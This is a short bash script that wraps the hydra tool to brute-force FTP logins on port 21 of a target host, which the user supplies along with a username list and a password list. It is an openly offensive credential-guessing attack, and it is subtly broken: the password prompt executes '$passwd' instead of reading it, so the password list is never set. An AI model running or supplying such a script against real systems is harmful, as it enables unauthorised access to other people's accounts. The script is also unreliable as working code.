#!/bin/bash

echo -n "Target: ~$ "
read host
echo -n "Userlist: ~$ "
read users
echo -n "Passlist: ~$ "
$passwd

sudo hydra -L $users -P $passwd -vV -s 21 $host ftp
